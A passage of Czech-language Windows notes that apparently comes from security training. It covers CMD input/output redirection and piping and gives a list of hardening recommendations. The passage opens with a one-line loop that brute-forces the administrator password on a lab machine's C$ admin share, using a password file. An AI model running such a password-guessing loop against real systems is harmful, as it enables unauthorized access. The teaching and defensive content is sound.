	FOR /F %h IN (pass.txt) DO NET USE \\192.168.56.10\c$ /user:administrator %h



Přesměrování vstupů / výstupů
-----------------------------
ECHO ahoj
ECHO ahoj > pozdrav.txt		Přesměrování výstupu do souboru. Pokud už soubor existuje, jeho obsah se přepíše.
ECHO ahoj >> pozdrav.txt	Přesměrování výstupu do souboru. Pokud už soubor existuje, vkládaný obsah se přidá na jeho konec.
TYPE pozdrav.txt | FINDSTR zdar Výstup prvního nástroje pošle na vstup druhého nástroje
ECHO ahoj && ECHO cau		Druhý příkaz se vykoná po prvním, ale pouze tehdy, pokud první příkaz skončil bez chyby
ECHO ahoj || ECHO cau		Druhý příkaz se vykoná po prvním, ale pouze tehdy, pokud první příkaz skončil s chybou
ECHO ahoj & ECHO cau		Druhý příkaz se vykoná po prvním vždy




Důležitá doporučení pro zvýšení bezpečnosti
-------------------------------------------
- Kontrola fyzické bezpečnosti
- Šifrování disku
- Běžní uživatelé nesmí nikdy fungovat pod účtem s admin oprávněním, vždy by měli využívat účty s nejnižším možným oprávněním
- Běžní uživatelé nesmí znát heslo administrátora
- Používejte aktualizovaný antivir (ale nespoléhejte na něj stoprocentně)
- Používejte Firewall s vhodně nastavenými pravidly včetně nastaveného scope
- Používejte IDS / IPS
- Používejte Aplikační Whitelisting (SRP, Applocker)
- Nikdy nebootovat z nedůvěryhodných médií (minimálně pokud nemáme šifrované disky, nebo je neodpojíme)
- Na zařízeních nesmí být nikdy ve skupině lokálních administrátorů doménové účty, vždy pouze lokální účet administrátora, který má na všech zařízeních jiné heslo (ideálně LAPS)
- Pravidelné zálohování (včetně ověřování funkčnosti) s ukládáním záloh na geograficky odděleném místě
- Pravidelné a včasné aktualizace OS, veškerý SW, všechny add-ony




